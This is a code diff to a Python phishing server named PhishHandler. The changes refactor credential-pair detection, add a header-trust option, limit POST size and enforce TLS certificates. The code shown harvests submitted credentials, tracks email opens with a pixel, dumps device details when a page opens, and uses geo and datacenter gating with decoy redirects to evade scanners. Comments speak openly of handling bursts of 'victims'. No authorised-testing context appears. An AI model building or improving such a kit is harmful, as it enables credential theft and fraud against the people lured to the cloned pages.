@@ -4,20 +4,21 @@
 # No PHP dependency. Runs on any Python 3.10+.
 
 import http.server
-import socketserver
-import ssl
-import os
 import json
+import os
 import re
 import secrets
+import socketserver
+import ssl
 import time
-import urllib.parse
 from urllib.parse import parse_qs, urlparse
+
 from . import capture as cap
+from . import classify
 from . import intel as intel_mod
-from .intel import INTEL_PATH, INTEL_JS_PATH
-from . import templates as tpl
 from . import risk as riskmod
+from . import templates as tpl
+from .intel import INTEL_JS_PATH, INTEL_PATH
 
 # 1x1 transparent GIF (43 bytes) served at /px.gif for email open-tracking
 GIF_1PX = (b"GIF89a\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!"
@@ -55,30 +56,21 @@ def _extract_fields(raw: bytes, ct: str) -> dict:
         except Exception:
             return {}
         return {}
-    return {k: v[0] for k, v in parse_qs(raw.decode("utf-8", "replace")).items()}
+    return {k: v[0] for k, v in parse_qs(raw.decode("utf-8", "replace"), keep_blank_values=True).items()}
 
 def _is_creds(d: dict) -> bool:
-    """True when the submission looks like a credential pair.
+    """Credential-pair detection — one implementation for the whole tool.
 
-    Two tiers: exact well-known field names first, then a substring heuristic so
-    real-world variants (login_id, user_name, acct_email + passwd/passcode/…
-    and imported custom templates) are still recognised.
+    The rule lives in core/classify.py so the static server and the reverse
+    proxy can never disagree. (The old substring version matched 'pin' inside
+    'shipping', turning an address form into a credential pair.)
     """
-    keys = [k.lower() for k in d]
-    id_exact = {"username", "email", "login", "user", "user_name", "email_address",
-                "user_id", "username_or_email", "email_or_username", "userid", "login_id"}
-    pw_exact = {"password", "passw", "pwd", "password_confirm", "passwd", "pass_code",
-                "password_confirmation", "pass", "passphrase"}
-    if (id_exact & set(keys)) and (pw_exact & set(keys)):
-        return True
-    ident = any(any(t in k for t in ("user", "login", "email", "mail", "account",
-                                     "identifier", "phone", "mobile")) for k in keys)
-    secret = any(any(t in k for t in ("pass", "pwd", "pin", "secret")) for k in keys)
-    return ident and secret
+    return classify.is_credential_pair(d)
 
 def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", otp=False,
                  on_capture=None, site_name=None, campaign=None, rotate_dirs=None,
-                 gate=None, decoy_url="", intel=True, intel_perms=False):
+                 gate=None, decoy_url="", intel=True, intel_perms=False,
+                 trust_headers=True):
     # A class body cannot see the enclosing function's locals for a name it is
     # itself assigning (`gate = gate` raises NameError), so bind through
     # differently-named locals.
@@ -86,6 +78,7 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
     _decoy_url = decoy_url
     _intel_on = bool(intel)
     _intel_perms = bool(intel_perms)
+    _trust_headers = bool(trust_headers)
     _rotation = list(rotate_dirs or [])
     _notifier = on_capture
 
@@ -108,6 +101,7 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
         decoy = _decoy_url
         intel_on = _intel_on                   # deep device dump on page open
         intel_perms = _intel_perms             # permission-gated probes
+        trust_headers = _trust_headers         # honour tunnel/edge IP headers
         geo_cache = {}                         # ip -> (ts, geo), for gating lookups
         geo_cache_ttl = 600
 
@@ -115,8 +109,17 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
             pass  # silence default stderr logging; structured logs go to DB
 
         def _client_ip(self):
-            """Real client IP: tunnel/edge headers win over the socket address,
-            otherwise every hit behind cloudflared/ngrok looks like 127.0.0.1."""
+            """Real client IP.
+
+            Behind a tunnel the socket address is always the tunnel's local
+            connection, so the edge headers must win — that is why they are
+            trusted by default. When the server is exposed directly, those
+            headers are attacker-controlled and let a client spoof its way past
+            the country/datacenter rules and the per-IP hit cap, so
+            --no-trust-headers uses the socket address instead.
+            """
+            if not self.trust_headers:
+                return self.client_address[0]
             for h in ("CF-Connecting-IP", "True-Client-IP", "X-Real-IP"):
                 v = self.headers.get(h)
                 if v:
@@ -246,18 +249,8 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
                 return {"ip": ip, "city": "", "country": "", "isp": ""}
 
         def _device(self, ua: str):
-            ua_l = ua.lower()
-            if "iphone" in ua_l or "ipad" in ua_l:
-                return "ios"
-            if "android" in ua_l:
-                return "android"
-            if "mac" in ua_l:
-                return "macos"
-            if "win" in ua_l:
-                return "windows"
-            if "linux" in ua_l:
-                return "linux"
-            return "unknown"
+            # one implementation, shared with the proxy (core/classify.py)
+            return classify.classify_device(ua)
 
         def _intel_sid(self):
             """Session id for the device dump: reuse the __bhi cookie, else mint one."""
@@ -372,6 +365,18 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
                 self._json(self._store_intel(payload))
                 return
             length = int(self.headers.get("Content-Length", 0))
+            if length < 0:
+                length = 0
+            if length > 2 * 1024 * 1024:
+                self.send_response(413)
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+                return
+            # POST counts against the hit cap as well: a POST-only client used to
+            # bypass --max-hits entirely (only GET called note_hit)
+            _ip = self._client_ip()
+            if self.gate and self.gate.enabled:
+                self.gate.note_hit(_ip)
             raw = self.rfile.read(length)
             ct = (self.headers.get("Content-Type") or "").lower()
             fields = _extract_fields(raw, ct)
@@ -433,7 +438,7 @@ def make_handler(templates_dir, db_path, geo_provider="ipapi", redirect_url="", 
     return PhishHandler
 
 def serve(templates_dir, site_folder, port, db_path, geo_provider="ipapi", intel=True,
-          intel_perms=False,
+          intel_perms=False, trust_headers=True,
             redirect_url="", otp=False, tls=False, cert_path=None,
             on_capture=None, site_name=None, campaign=None, rotate_dirs=None,
             gate=None, decoy_url=""):
@@ -441,7 +446,8 @@ def serve(templates_dir, site_folder, port, db_path, geo_provider="ipapi", intel
     Handler = make_handler(templates_dir, db_path, geo_provider, redirect_url, otp,
                            on_capture=on_capture, site_name=site_name, campaign=campaign,
                            rotate_dirs=rotate_dirs, gate=gate, decoy_url=decoy_url,
-                           intel=intel, intel_perms=intel_perms)
+                           intel=intel, intel_perms=intel_perms,
+                           trust_headers=trust_headers)
     class _ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
         daemon_threads = True
         # HTTPServer's default backlog is 5; a burst of simultaneous victims
@@ -449,6 +455,9 @@ def serve(templates_dir, site_folder, port, db_path, geo_provider="ipapi", intel
         request_queue_size = 128
         allow_reuse_address = True
     httpd = _ThreadingHTTPServer(("0.0.0.0", port), Handler)
+    if tls and not cert_path:
+        raise ValueError("--tls needs --cert <pem>: refusing to serve plaintext "
+                         "when TLS was requested")
     if tls and cert_path:
         ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
         # key path: "cert_cert.pem" -> "cert_key.pem"; anything else gets ".key"
